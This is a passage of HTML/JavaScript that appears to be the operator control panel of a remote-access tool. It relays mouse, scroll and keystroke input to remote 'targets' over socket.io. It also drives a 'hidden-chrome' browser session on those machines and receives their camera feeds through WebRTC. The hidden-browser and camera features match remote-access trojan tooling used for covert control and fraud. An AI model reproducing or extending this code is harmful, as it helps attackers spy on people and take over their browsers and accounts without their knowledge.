            lastMoveTime = now;
            
            const coords = mapCoordinates(e, e.target);
            socket.emit('remote-action', { 
                targetId: activeTarget, 
                action: { type: 'move', x: coords.x, y: coords.y } 
            });
        };

        document.getElementById('preview-video').onclick = (e) => {
            if (activeType !== 'remote') return;
            document.getElementById('preview-video').focus(); // Ensure it captures keyboard
            const coords = mapCoordinates(e, e.target);
            socket.emit('remote-action', { 
                targetId: activeTarget, 
                action: { type: 'click', x: coords.x, y: coords.y } 
            });
        };

        // Handle native right-click on the remote screen
        document.getElementById('preview-video').oncontextmenu = (e) => {
            if (activeType !== 'remote') return;
            e.preventDefault(); // Stop local browser right-click menu
            document.getElementById('preview-video').focus();
            const coords = mapCoordinates(e, e.target);
            socket.emit('remote-action', { 
                targetId: activeTarget, 
                action: { type: 'rclick', x: coords.x, y: coords.y } 
            });
        };

        // Handle Mouse Scroll
        document.getElementById('preview-video').onwheel = (e) => {
            if (activeType !== 'remote') return;
            e.preventDefault();
            // Negative deltaY means scrolling UP. In mouse_event, positive is UP.
            const amount = e.deltaY < 0 ? 120 : -120;
            socket.emit('remote-action', { 
                targetId: activeTarget, 
                action: { type: 'scroll', amount: amount } 
            });
        };

        // Handle Real-time Keyboard Typing
        document.getElementById('preview-video').addEventListener('keydown', (e) => {
            if (activeType !== 'remote') return;
            e.preventDefault();
            
            let keyToSend = e.key;
            if (keyToSend.length === 1) {
                // escape special characters for SendKeys
                if (['+', '^', '%', '~', '(', ')', '{', '}', '[', ']'].includes(keyToSend)) {
                    keyToSend = `{${keyToSend}}`;
                }
            } else {
                // Special keys mapping
                const keyMap = {
                    'Enter': '{ENTER}', 'Backspace': '{BACKSPACE}', 'Tab': '{TAB}', 'Escape': '{ESC}',
                    'ArrowUp': '{UP}', 'ArrowDown': '{DOWN}', 'ArrowLeft': '{LEFT}', 'ArrowRight': '{RIGHT}',
                    'Delete': '{DEL}', 'Home': '{HOME}', 'End': '{END}', 'PageUp': '{PGUP}', 'PageDown': '{PGDN}',
                    'Space': ' '
                };
                keyToSend = keyMap[keyToSend] || '';
            }

            if (keyToSend) {
                socket.emit('remote-action', { 
                    targetId: activeTarget, 
                    action: { type: 'type', text: keyToSend } 
                });
            }
        });

        document.getElementById('sendTextBtn').onclick = () => {
            const txt = document.getElementById('remoteText').value;
            if (txt) {
                if (activeType === 'hidden-chrome') {
                    for (let i=0; i<txt.length; i++) {
                        socket.emit('hidden-chrome-action', { 
                            targetId: activeTarget, 
                            action: { type: 'type', text: txt[i] } 
                        });
                    }
                } else {
                    socket.emit('remote-action', { 
                        targetId: activeTarget, 
                        action: { type: 'type', text: txt } 
                    });
                }
                document.getElementById('remoteText').value = "";
            }
        };

        // --- Hidden Chrome Events ---
        const hiddenImg = document.getElementById('hidden-chrome-img');

        let lastHiddenMoveTime = 0;
        hiddenImg.onmousemove = (e) => {
            if (activeType !== 'hidden-chrome') return;
            const now = Date.now();
            if (now - lastHiddenMoveTime < 60) return;
            lastHiddenMoveTime = now;
            
            const coords = mapCoordinates(e, e.target);
            socket.emit('hidden-chrome-action', { 
                targetId: activeTarget, 
                action: { type: 'move', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
            });
        };

        hiddenImg.onclick = (e) => {
            if (activeType !== 'hidden-chrome') return;
            hiddenImg.focus();
            const coords = mapCoordinates(e, e.target);
            socket.emit('hidden-chrome-action', { 
                targetId: activeTarget, 
                action: { type: 'click', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
            });
        };

        hiddenImg.oncontextmenu = (e) => {
            if (activeType !== 'hidden-chrome') return;
            e.preventDefault();
            hiddenImg.focus();
            const coords = mapCoordinates(e, e.target);
            socket.emit('hidden-chrome-action', { 
                targetId: activeTarget, 
                action: { type: 'rclick', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
            });
        };

        hiddenImg.onwheel = (e) => {
            if (activeType !== 'hidden-chrome') return;
            e.preventDefault();
            const amount = e.deltaY;
            const coords = mapCoordinates(e, e.target);
            socket.emit('hidden-chrome-action', { 
                targetId: activeTarget, 
                action: { type: 'scroll', amount: amount, x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
            });
        };

        hiddenImg.addEventListener('keydown', (e) => {
            if (activeType !== 'hidden-chrome') return;
            e.preventDefault();
            
            let keyToSend = e.key;
            socket.emit('hidden-chrome-action', { 
                targetId: activeTarget, 
                action: { type: 'type', text: keyToSend } 
            });
        });

        // WebRTC Signaling for Camera clients
        socket.on('offer', async (data) => {
            if (data.from !== activeTarget) return;
            if (peerConnection) peerConnection.close();
            
            peerConnection = new RTCPeerConnection(configuration);
            iceCandidatesQueue = [];
            
            peerConnection.onicecandidate = e => {
                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: activeTarget });
            };
            
            peerConnection.onconnectionstatechange = () => {
                console.log("Connection state:", peerConnection.connectionState);
            };
            
            peerConnection.ontrack = e => {
                console.log("Track received:", e.streams[0]);
                const video = document.getElementById('preview-video');
                if (video.srcObject !== e.streams[0]) {
                    video.srcObject = e.streams[0];
                    video.play().catch(err => console.error("Video play error:", err));
                }
            };

            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
            
            // Process any ICE candidates that arrived before the offer
            for (let candidate of iceCandidatesQueue) {
                try {
                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                } catch (err) { console.error("ICE error", err); }
            }
            iceCandidatesQueue = [];

            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('answer', { answer, targetId: activeTarget });
        });

        socket.on('ice-candidate', async (data) => {
            if (data.from === activeTarget) {
                if (peerConnection && peerConnection.remoteDescription) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                    } catch (err) { console.error("ICE error", err); }
                } else {
                    iceCandidatesQueue.push(data.candidate);
                }
            }
        });
    </script>
</body>
</html>
